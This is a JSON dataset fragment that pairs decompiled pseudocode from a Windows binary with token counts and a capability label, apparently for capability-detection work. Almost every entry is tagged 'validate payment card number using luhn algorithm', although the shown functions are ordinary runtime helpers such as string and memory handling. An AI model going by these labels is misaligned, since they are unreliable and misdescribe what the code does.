    "004c7f7f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004c7f7f(void)\n\n{\n    fcn.004c8177(0x16, \"LocaleNameToLCID\", 0x55345c, 0x553464);\n    return;\n}\n",
        "token_count": 51
    },
    "00404a2a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00404a2a(uint32_t arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    int32_t arg_10h_00;\n    uint32_t arg_ch_00;\n    uint arg_ch_01;\n    code *pcVar1;\n    int32_t iVar2;\n    uint arg_8h_00;\n    uint *in_ECX;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    arg_10h_00 = in_ECX[4];\n    if (arg_8h <= 0x7ffffffeU - arg_10h_00) {\n        arg_ch_00 = in_ECX[5];\n        iVar2 = fcn.00401de8(arg_10h_00 + arg_8h, arg_ch_00, 0x7ffffffe);\n        arg_8h_00 = fcn.0040376a(iVar2 + 1);\n        in_ECX[4] = arg_10h_00 + arg_8h;\n        in_ECX[5] = iVar2;\n        if (arg_ch_00 < 8) {\n            fcn.004054fc(arg_8h_00, in_ECX, arg_10h_00, arg_10h, arg_14h, arg_18h);\n        }\n        else {\n            arg_ch_01 = *in_ECX;\n            fcn.004054fc(arg_8h_00, arg_ch_01, arg_10h_00, arg_10h, arg_14h, arg_18h);\n            fcn.00401659(arg_ch_01, arg_ch_00 * 2 + 2);\n        }\n        *in_ECX = arg_8h_00;\n        return;\n    }\n    fcn.004038aa();\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 438
    },
    "00479e78": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.00479e78(uint *arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint noname_4, uint noname_5, uint32_t *arg_20h, \n            int32_t arg_24h)\n\n{\n    int32_t iVar1;\n    int32_t in_ECX;\n    \n    iVar1 = fcn.004046a6(&arg_ch, &arg_14h, 0, *(in_ECX + 8), 0);\n    if (iVar1 < 0) {\n        *arg_20h = *arg_20h | 2;\n    }\n    else {\n        *(arg_24h + 0x18) = iVar1 >> 1;\n    }\n    *arg_8h = arg_ch;\n    arg_8h[1] = arg_10h;\n    return;\n}\n",
        "token_count": 197
    },
    "0047c2da": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint16_t * __cdecl fcn.0047c2da(uint16_t *arg_8h, uint16_t *arg_ch)\n\n{\n    uint16_t uVar1;\n    int32_t in_ECX;\n    \n    if (arg_8h != arg_ch) {\n        do {\n            uVar1 = fcn.00404228(*arg_8h, in_ECX + 8);\n            *arg_8h = uVar1;\n            arg_8h = arg_8h + 1;\n        } while (arg_8h != arg_ch);\n    }\n    return arg_8h;\n}\n",
        "token_count": 135
    },
    "00404b1f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00404b1f(uint *arg_8h, uint arg_ch, uint arg_10h, uint16_t *arg_14h, int32_t arg_18h)\n\n{\n    if (arg_18h != 0) {\n        do {\n            fcn.00401d9d(*arg_14h);\n            arg_14h = arg_14h + 1;\n            arg_18h = arg_18h + -1;\n        } while (arg_18h != 0);\n    }\n    *arg_8h = arg_ch;\n    arg_8h[1] = arg_10h;\n    return;\n}\n",
        "token_count": 147
    },
    "00404b97": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00404b97(uint arg_8h)\n\n{\n    uint arg_10h;\n    uint var_10h;\n    uint var_8h;\n    \n    arg_10h = fcn.00403535(&var_8h, 0);\n    fcn.00402e87(&var_10h, 0x60, arg_10h);\n    fcn.004032bf(arg_8h, 0x27);\n    return arg_8h;\n}\n",
        "token_count": 110
    },
    "00404bb5": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nbool __cdecl fcn.00404bb5(uint32_t arg_8h)\n\n{\n    uint *puVar1;\n    int32_t in_ECX;\n    bool bVar2;\n    int32_t var_4h;\n    \n    if (arg_8h < 0x80000000) {\n        arg_8h = arg_8h * 2;\n        if (((*(in_ECX + 0x404) == 0) && (arg_8h < 0x401)) ||\n           (arg_8h < *(in_ECX + 0x400) || arg_8h == *(in_ECX + 0x400))) {\n            bVar2 = true;\n        }\n        else {\n            var_4h = fcn.00403ff3(arg_8h);\n            bVar2 = var_4h != 0;\n            if (bVar2) {\n                fcn.00403efe(&var_4h);\n                *(in_ECX + 0x400) = arg_8h;\n            }\n            fcn.00406302(var_4h);\n        }\n    }\n    else {\n        puVar1 = fcn.004039a4();\n        *puVar1 = 0xc;\n        bVar2 = false;\n    }\n    return bVar2;\n}\n",
        "token_count": 286
    },
    "00404be2": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00404be2(int32_t arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint var_4h;\n    \n    iVar1 = fcn.00403bfc(arg_8h, arg_8h + 0x34, &arg_ch);\n    return iVar1 - arg_8h >> 1;\n}\n",
        "token_count": 85
    },
    "00404c96": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00404c96(uint32_t arg_8h, uint noname_1, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint32_t arg_ch;\n    code *pcVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t *in_ECX;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar1 = in_ECX[4];\n    if (arg_8h <= 0x7ffffffeU - iVar1) {\n        arg_ch = in_ECX[5];\n        iVar3 = fcn.00401de8(iVar1 + arg_8h, arg_ch, 0x7ffffffe);\n        iVar4 = fcn.0040376a(iVar3 + 1);\n        in_ECX[5] = iVar3;\n        in_ECX[4] = iVar1 + arg_8h;\n        if (arg_ch < 8) {\n            fcn.0040576d(iVar4);\n            *(iVar1 * 2 + iVar4) = arg_10h;\n            *(iVar1 * 2 + 2 + iVar4) = 0;\n        }\n        else {\n            iVar3 = *in_ECX;\n            fcn.0040576d(iVar4, iVar3, iVar1 * 2);\n            *(iVar1 * 2 + iVar4) = arg_10h;\n            *(iVar1 * 2 + 2 + iVar4) = 0;\n            fcn.00401659(iVar3, arg_ch * 2 + 2);\n        }\n        *in_ECX = iVar4;\n        return;\n    }\n    fcn.004038aa();\n    pcVar2 = swi(3);\n    (*pcVar2)();\n    return;\n}\n",
        "token_count": 402
    },
    "0047ba1e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_44h\n\nvoid __cdecl fcn.0047ba1e(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    uint arg_24h;\n    uint in_ECX;\n    uint var_44h;\n    uint32_t var_4h;\n    \n    var_4h = *0x56cca8 ^ &stack0xfffffffc;\n    arg_24h = fcn.004054ed(&var_44h, 0x40, 0x54d9e4, arg_1ch);\n    fcn.004030df(in_ECX, arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, &var_44h, arg_24h);\n    fcn.00403085(var_44h);\n    return;\n}\n",
        "token_count": 210
    },
    "00404d4f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuchar * __cdecl fcn.00404d4f(uint noname_0, uchar *arg_ch, char *arg_10h, uint32_t arg_14h)\n\n{\n    uint8_t uVar1;\n    char *pcVar2;\n    ushort *puVar3;\n    \n    *arg_ch = 0x25;\n    pcVar2 = arg_ch + 1;\n    if ((arg_14h & 0x20) != 0) {\n        *pcVar2 = '+';\n        pcVar2 = arg_ch + 2;\n    }\n    if ((arg_14h & 8) != 0) {\n        *pcVar2 = '#';\n        pcVar2 = pcVar2 + 1;\n    }\n    puVar3 = pcVar2 + 1;\n    if (*arg_10h == 'L') {\n        *pcVar2 = 'I';\n        *puVar3 = 0x3436;\n        puVar3 = pcVar2 + 3;\n    }\n    else {\n        *pcVar2 = *arg_10h;\n    }\n    if ((arg_14h & 0xe00) == 0x400) {\n        uVar1 = 0x6f;\n    }\n    else if ((arg_14h & 0xe00) == 0x800) {\n        uVar1 = ~(arg_14h << 3) & 0x20U | 0x58;\n    }\n    else {\n        uVar1 = arg_10h[1];\n    }\n    *puVar3 = uVar1;\n    *(puVar3 + 1) = 0;\n    return arg_ch;\n}\n",
        "token_count": 365
    },
    "00404d5e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00404d5e(uint32_t arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint *in_ECX;\n    uint var_4h;\n    \n    iVar1 = in_ECX[4];\n    if (in_ECX[5] - iVar1 < arg_8h) {\n        fcn.004011b8(arg_8h, in_ECX, arg_8h, arg_ch);\n    }\n    else {\n        in_ECX[4] = iVar1 + arg_8h;\n        if (0xf < in_ECX[5]) {\n            in_ECX = *in_ECX;\n        }\n        fcn.0040314d(in_ECX + iVar1, arg_ch, arg_8h);\n        *(in_ECX + iVar1 + arg_8h) = 0;\n    }\n    return;\n}\n",
        "token_count": 194
    },
    "00404da4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00404da4(int16_t *arg_8h)\n\n{\n    int16_t iVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int16_t *piVar5;\n    \n    piVar5 = arg_8h;\n    do {\n        iVar1 = *piVar5;\n        piVar5 = piVar5 + 1;\n    } while (iVar1 != 0);\n    iVar4 = (piVar5 - (arg_8h + 1) >> 1) + 1;\n    iVar3 = fcn.00403387(iVar4, 2);\n    if (iVar3 != 0) {\n        fcn.0040576d(iVar3, arg_8h, iVar4 * 2);\n        return iVar3;\n    }\n    fcn.004010a5();\n    pcVar2 = swi(3);\n    iVar4 = (*pcVar2)();\n    return iVar4;\n}\n",
        "token_count": 222
    },
    "00404e26": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00404e26(uint lpCriticalSection, uint dwSpinCount, uint arg_10h)\n\n{\n    code *pcVar1;\n    \n    pcVar1 = fcn.004c8177(0x12, \"InitializeCriticalSectionEx\", 0x5533f0, 0x5533f8);\n    if (pcVar1 == NULL) {\n        (*_sym.imp.KERNEL32.dll_InitializeCriticalSectionAndSpinCount)(lpCriticalSection, dwSpinCount);\n    }\n    else {\n        (**0x573000)(lpCriticalSection, dwSpinCount, arg_10h);\n        (*pcVar1)();\n    }\n    return;\n}\n",
        "token_count": 142
    },
    "00418000": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.00418000(int32_t noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6\n            , uint noname_7, uint arg_8h)\n\n{\n    code **in_ECX;\n    int32_t *in_FS_OFFSET;\n    uint var_1ch;\n    code **var_20h;\n    uint *puStack32;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    \n    puStack32 = &var_20h;\n    var_14h = 0x41e2a0;\n    var_18h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_18h;\n    *in_ECX = vtable.std::exception.0;\n    in_ECX[2] = NULL;\n    in_ECX[1] = NULL;\n    var_10h = 0;\n    var_20h = in_ECX;\n    fcn.00402dd3(noname_0 + 4, in_ECX + 1);\n    *var_20h = vtable.std::bad_alloc.0;\n    *in_FS_OFFSET = var_18h;\n    return;\n}\n",
        "token_count": 287
    },
    "00404e62": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nvoid __cdecl fcn.00404e62(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint var_1h;\n    \n    fcn.004ba3ce(arg_8h, arg_ch, &var_1h, arg_10h);\n    return;\n}\n",
        "token_count": 83
    },
    "00404f2f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00404f2f(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    code *pcVar1;\n    \n    pcVar1 = fcn.004c7f3f();\n    if (pcVar1 == NULL) {\n        fcn.0040281f(arg_8h, arg_ch, arg_10h);\n    }\n    else {\n        (**0x573000)(arg_8h, arg_ch, arg_10h, arg_14h);\n        (*pcVar1)();\n    }\n    return;\n}\n",
        "token_count": 131
    },
    "00404f48": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nchar * __cdecl fcn.00404f48(int32_t arg_8h)\n\n{\n    int32_t *piVar1;\n    \n    piVar1 = 0x54cd80;\n    do {\n        if (*piVar1 == arg_8h) {\n            return piVar1[1];\n        }\n        piVar1 = piVar1 + 2;\n    } while (piVar1 != 0x54cff0);\n    return \"unknown error\";\n}\n",
        "token_count": 103
    },
    "00404f70": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.00404f70(uint arg_8h, uint noname_1, uint arg_10h)\n\n{\n    ushort extraout_var;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_ch = 0;\n    var_8h = 0;\n    var_4h._0_2_ = 0;\n    fcn.00403cdd(&var_4h, &arg_8h, 1, &var_ch, arg_10h);\n    return CONCAT22(extraout_var, var_4h);\n}\n",
        "token_count": 142
    },
    "00404fa2": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00404fa2(uint arg_8h, uint arg_ch, int32_t arg_10h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    \n    iVar2 = fcn.004038dc(arg_8h, arg_ch, arg_10h);\n    if (iVar2 == 0) {\n        if (*(arg_10h + 0x80) != 0) {\n            fcn.00405de4(arg_8h, arg_ch, 2);\n        }\n        if (*(arg_10h + 0x100) != 0) {\n            fcn.00405de4(arg_8h, arg_ch, 2);\n        }\n        return;\n    }\n    fcn.004035f8(0, 0, 0, 0, 0);\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 204
    },
    "004050c9": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_10h\n\nvoid __cdecl fcn.004050c9(uint *arg_8h, uint *arg_ch, int32_t arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    uint *puVar1;\n    uint var_10h;\n    uint var_ch;\n    uint32_t var_4h;\n    \n    var_4h = *0x56cca8 ^ &stack0xfffffffc;\n    if ((arg_ch == NULL) && (arg_10h != 0)) {\n        puVar1 = fcn.004039a4();\n        *puVar1 = 0x16;\n        fcn.00403751();\n    }\n    else {\n        var_10h = 0xffffffff;\n        if (arg_ch == NULL) {\n            arg_10h = 5;\n            arg_ch = &var_ch;\n        }\n        fcn.004dc4c6(&var_10h, arg_ch, arg_10h, arg_14h, arg_18h, 0);\n        if (arg_8h != NULL) {\n            *arg_8h = var_10h;\n        }\n    }\n    fcn.00403085(var_10h);\n    return;\n}\n",
        "token_count": 281
    },
    "004050fb": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nvoid __cdecl fcn.004050fb(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint var_1h;\n    \n    fcn.004ba4ac(arg_8h, arg_ch, &var_1h, arg_10h);\n    return;\n}\n",
        "token_count": 82
    },
    "004054bb": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __cdecl fcn.004054bb(uint arg_8h)\n\n{\n    uint32_t uVar1;\n    int32_t in_ECX;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_ch = 0;\n    var_8h = 0;\n    uVar1 = fcn.00403cdd(&var_4h, &arg_8h, 1, &var_ch, in_ECX + 0x18);\n    if (uVar1 < 0) {\n        uVar1 = 0xffff;\n    }\n    else {\n        uVar1 = uVar1 & 0xffff0000 | var_4h;\n    }\n    return uVar1;\n}\n",
        "token_count": 175
    },
    "00405191": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00405191(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t in_ECX;\n    uint8_t *puVar2;\n    int32_t iVar3;\n    \n    iVar3 = 0;\n    puVar2 = *(in_ECX + 0x34);\n    if (0 < arg_8h) {\n        do {\n            if (*puVar2 == 0) {\n                return iVar3;\n            }\n            iVar1 = fcn.004060eb(***(in_ECX + 8), *puVar2, 0x8000);\n            if (iVar1 != 0) {\n                puVar2 = puVar2 + 1;\n            }\n            puVar2 = puVar2 + 1;\n            iVar3 = iVar3 + 1;\n        } while (iVar3 < arg_8h);\n    }\n    return iVar3;\n}\n",
        "token_count": 203
    },
    "00479aae": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.00479aae(uint *arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint noname_4, uint noname_5, uint32_t *arg_20h, \n            int32_t arg_24h)\n\n{\n    int32_t iVar1;\n    int32_t in_ECX;\n    \n    iVar1 = fcn.00406249(&arg_ch, &arg_14h, 0, *(in_ECX + 0xc), 0);\n    if (iVar1 < 0) {\n        *arg_20h = *arg_20h | 2;\n    }\n    else {\n        *(arg_24h + 0x10) = iVar1 >> 1;\n    }\n    *arg_8h = arg_ch;\n    arg_8h[1] = arg_10h;\n    return;\n}\n",
        "token_count": 197
    },
    "004051dc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004051dc(int32_t arg_8h)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    int32_t in_ECX;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    \n    uVar4 = arg_8h + 7U & 0xfffffff8;\n    if (uVar4 == 0) {\n        uVar4 = 8;\n    }\n    uVar3 = *(in_ECX + 0x10);\n    if (uVar3 < uVar4) {\n        uVar3 = 0x1000;\n        if (uVar4 < 0x1001) {\n            puVar1 = fcn.004036ac(0x1004, 0x56f474, 1);\n            if (puVar1 != NULL) {\n                *puVar1 = 0;\n                if (*(in_ECX + 0xc) == NULL) {\n                    *(in_ECX + 8) = puVar1;\n                }\n                else {\n                    **(in_ECX + 0xc) = puVar1;\n                }\n                *(in_ECX + 0xc) = puVar1;\n                goto code_r0x0048df7e;\n            }\n        }\n        iVar2 = 0;\n    }\n    else {\ncode_r0x0048df7e:\n        *(in_ECX + 0x10) = uVar3 - uVar4;\n        iVar2 = *(in_ECX + 0xc) + 4 + (uVar3 - uVar4);\n    }\n    return iVar2;\n}\n",
        "token_count": 358
    },
    "00405290": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00405290(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = arg_8h + -1;\n    return (iVar1 + (iVar1 >> 0x1f & 3U) >> 2) + -0x11 + ((arg_8h + 299) / 400 - iVar1 / 100);\n}\n",
        "token_count": 91
    },
    "0040529f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0040529f(int32_t param_1)\n\n{\n    int32_t *arg_8h;\n    int32_t iVar1;\n    uint uVar2;\n    \n    arg_8h = param_1 + 0x28;\n    if (*(param_1 + 0x32) != 0x2a) {\n        uVar2 = fcn.00401bd1(arg_8h);\n        return uVar2;\n    }\n    *(param_1 + 0x14) = *(param_1 + 0x14) + 4;\n    iVar1 = *(*(param_1 + 0x14) + -4);\n    *arg_8h = iVar1;\n    if (iVar1 < 0) {\n        *arg_8h = -1;\n    }\n    return CONCAT31(iVar1 >> 8, 1);\n}\n",
        "token_count": 195
    },
    "004814b9": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.004814b9(uint *arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint noname_4, uint noname_5, uint32_t *arg_20h, \n            int32_t arg_24h)\n\n{\n    int32_t iVar1;\n    int32_t in_ECX;\n    \n    iVar1 = fcn.0040430e(&arg_ch, &arg_14h, 0, *(in_ECX + 0xc), 0);\n    if (iVar1 < 0) {\n        *arg_20h = *arg_20h | 2;\n    }\n    else {\n        *(arg_24h + 0x10) = iVar1 >> 1;\n    }\n    *arg_8h = arg_ch;\n    arg_8h[1] = arg_10h;\n    return;\n}\n",
        "token_count": 198
    },
    "0040533a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0040533a(uint hModule, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint var_22ch;\n    uint var_228h;\n    uint var_224h;\n    uint var_220h;\n    uint var_21ch;\n    uint var_218h;\n    uchar var_211h;\n    uint lpFilename;\n    uint32_t var_4h;\n    \n    var_4h = *0x56cca8 ^ &stack0xfffffffc;\n    iVar1 = (*_sym.imp.KERNEL32.dll_GetModuleFileNameW)(hModule, &lpFilename, 0x105);\n    if (iVar1 == 0) {\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        fcn.00404b01(uVar2);\n    }\n    else {\n        var_21ch = 0;\n        var_22ch = arg_ch;\n        var_228h = arg_10h;\n        var_224h = arg_ch;\n        var_220h = arg_10h;\n        var_218h._0_1_ = 0;\n        uVar2 = fcn.00403b0c();\n        fcn.004c58b9(&lpFilename, &var_22ch, &var_211h, uVar2);\n    }\n    fcn.00403085(hModule);\n    return;\n}\n",
        "token_count": 326
    },
    "00479e26": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.00479e26(uint *arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint noname_4, uint noname_5, uint32_t *arg_20h, \n            int32_t arg_24h)\n\n{\n    int32_t iVar1;\n    int32_t in_ECX;\n    \n    iVar1 = fcn.00406249(&arg_ch, &arg_14h, 0, *(in_ECX + 8), 0);\n    if (iVar1 < 0) {\n        *arg_20h = *arg_20h | 2;\n    }\n    else {\n        *(arg_24h + 0x18) = iVar1 >> 1;\n    }\n    *arg_8h = arg_ch;\n    arg_8h[1] = arg_10h;\n    return;\n}\n",
        "token_count": 196
    },
    "004053df": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004053df(int32_t arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint var_4h;\n    \n    iVar1 = fcn.004034cc(arg_8h, arg_8h + 0xb, &arg_ch);\n    return iVar1 - arg_8h;\n}\n",
        "token_count": 79
    },
    "004053fd": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004053fd(uint32_t arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t arg_10h_00;\n    uint32_t arg_ch_00;\n    uint arg_ch_01;\n    code *pcVar1;\n    int32_t iVar2;\n    uint arg_8h_00;\n    uint *in_ECX;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    arg_10h_00 = in_ECX[4];\n    if (arg_8h <= 0x7ffffffeU - arg_10h_00) {\n        arg_ch_00 = in_ECX[5];\n        iVar2 = fcn.00401de8(arg_10h_00 + arg_8h, arg_ch_00, 0x7ffffffe);\n        arg_8h_00 = fcn.0040376a(iVar2 + 1);\n        in_ECX[4] = arg_10h_00 + arg_8h;\n        in_ECX[5] = iVar2;\n        if (arg_ch_00 < 8) {\n            fcn.0040107d(arg_8h_00, in_ECX, arg_10h_00, arg_10h, arg_14h);\n        }\n        else {\n            arg_ch_01 = *in_ECX;\n            fcn.0040107d(arg_8h_00, arg_ch_01, arg_10h_00, arg_10h, arg_14h);\n            fcn.00401659(arg_ch_01, arg_ch_00 * 2 + 2);\n        }\n        *in_ECX = arg_8h_00;\n        return;\n    }\n    fcn.004038aa();\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 422
    },
    "0040548e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.0040548e(uint arg_8h, uint noname_1, uint arg_10h)\n\n{\n    ushort extraout_var;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_ch = 0;\n    var_8h = 0;\n    var_4h._0_2_ = 0;\n    fcn.00403cdd(&var_4h, &arg_8h, 1, &var_ch, arg_10h);\n    return CONCAT22(extraout_var, var_4h);\n}\n",
        "token_count": 142
    },
    "004054ed": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.004054ed(uint param_1, uint param_2, uint param_3)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    \n    puVar1 = fcn.0040586c(&stack0x00000010);\n    iVar2 = fcn.00401e97(*puVar1, puVar1[1], param_1, param_2, param_3, 0, &stack0x00000010);\n    if (iVar2 < 0) {\n        iVar2 = -1;\n    }\n    return iVar2;\n}\n",
        "token_count": 131
    },
    "004054fc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.004054fc(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h, int32_t arg_14h, int32_t arg_18h, uint arg_1ch)\n\n{\n    fcn.0040576d(arg_8h, arg_ch, arg_14h * 2);\n    fcn.00404c50(arg_14h * 2 + arg_8h, arg_1ch, arg_18h);\n    fcn.0040576d(arg_8h + (arg_14h + arg_18h) * 2, arg_ch + arg_14h * 2, (arg_10h - arg_14h) * 2 + 2);\n    return;\n}\n",
        "token_count": 171
    },
    "00481675": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.00481675(uint *arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint noname_4, uint noname_5, uint32_t *arg_20h, \n            int32_t arg_24h)\n\n{\n    int32_t iVar1;\n    int32_t in_ECX;\n    \n    iVar1 = fcn.0040430e(&arg_ch, &arg_14h, 0, *(in_ECX + 8), 0);\n    if (iVar1 < 0) {\n        *arg_20h = *arg_20h | 2;\n    }\n    else {\n        *(arg_24h + 0x18) = iVar1 >> 1;\n    }\n    *arg_8h = arg_ch;\n    arg_8h[1] = arg_10h;\n    return;\n}\n",
        "token_count": 196
    },
    "0040555b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040555b(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    fcn.0040178f(arg_8h, 0xffffffff, arg_ch, arg_10h, arg_14h);\n    return;\n}\n",
        "token_count": 68
    },
    "0040556a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
